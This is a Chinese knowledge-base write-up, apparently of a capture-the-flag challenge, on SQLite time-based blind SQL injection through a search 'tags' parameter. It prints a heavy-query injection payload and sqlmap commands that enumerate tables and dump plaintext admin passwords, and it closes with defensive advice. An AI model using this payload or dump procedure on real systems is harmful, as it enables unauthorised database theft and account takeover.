---
id: web-generic-sqli-sqlite-tags-timeblind-sqlmap-plaintext-password
title: SQLite 搜索接口 tags 参数时间盲注：sqlmap 全自动拖库 dump 出未哈希的明文密码
type: scenario
domain: web
path: web/generic/sqli
technique: sqlite-timeblind-sqlmap-dump-plaintext-password
tags:
- web
- sqli
- sqlite
- sqlmap
- time-based-blind
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-28
  verified_at: '2026-11-08T15:06:08+08:00'
  notes: 已对照原文核对：图11-14 证实 RANDOMBLOB heavy query 时间盲注、7 张表、CREATE TABLE user 回读列、明文密码 dump；dedup_review 成立（与 MySQL UNION 链 DBMS/机制/回显均不同）
url: /docs/web/generic/sqli/web-generic-sqli-sqlite-tags-timeblind-sqlmap-plaintext-password/
draft: false
kb_aliases:
- SQLite 时间盲注
- sqlmap 拖库
- 搜索参数注入
- 明文密码未哈希
---

## 一句话结论

多标签搜索接口把 `tags` 参数直接拼进 SQLite 查询（无参数化），任一标签值可注入；虽然无回显只能时间盲注，sqlmap 仍可全自动完成 --tables/--columns/--dump，最终从 user 表拖出未哈希存储的明文 admin 密码。

## 原理

- 注入点 payload 形如 `tags=Dessert'||(SELECT CHAR(87,...) WHERE 5189=5189 AND 9689=LIKE(CHAR(65,6,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||'`：SQLite 的 `RANDOMBLOB` + `LIKE` 组合制造可测延迟，构成 heavy-query 时间盲注。
- SQLite 无 information_schema，sqlmap 改用 `sqlite_master` 枚举表名（user、login_attempt、login_session、personal_cookbook_entry、recipe、sqlite_sequence、to_try_entry），再通过 `CREATE TABLE user (...)` 语句回读列定义获得字段名（user_id、username、user_email、first_name、last_name、password、date_joined）。
- 密码字段未哈希明文存储，dump 即得凭据；响应慢时 sqlmap 自动把 delay 从 3s 逐级上调到 15s 保证盲注布尔判断可靠。

## 触发条件

- 拼接型 SQLite 查询且注入点在字符串上下文（`||` 拼接）；
- 应用响应时间不受 WAF 限制，允许 heavy query 拖慢。

## 利用步骤

1. `sqlmap -u "https://target/search?recipe_name=&description=&tags=Dessert"` 识别注入点（time-based blind, SQLite）。
2. `--tables` 列出 7 张表，锁定 user 表。
3. `-T user --columns` 从建表语句取得 password 字段。
4. `-T user -C password --dump` 拖出明文 `byuctf{...}`（即 admin 密码）。

## PoC

```bash
sqlmap -u "https://target/search?recipe_name=&description=&tags=Dessert" -T user -C password --dump
```

## 变体与关联

- 无回显时亦可转 bool 盲注/外带（readfile/attach）；有回显则 union 直接出数；
- 密码明文存储使注入直接升级为账户接管——若为哈希还需另行走撞库。

## 检测与防御

- 查询参数化/预编译，标签值走白名单；
- 密码使用 argon2/bcrypt 哈希存储；
- 限制单查询时长与 RANDOMBLOB 类重计算函数，部署时延异常告警。
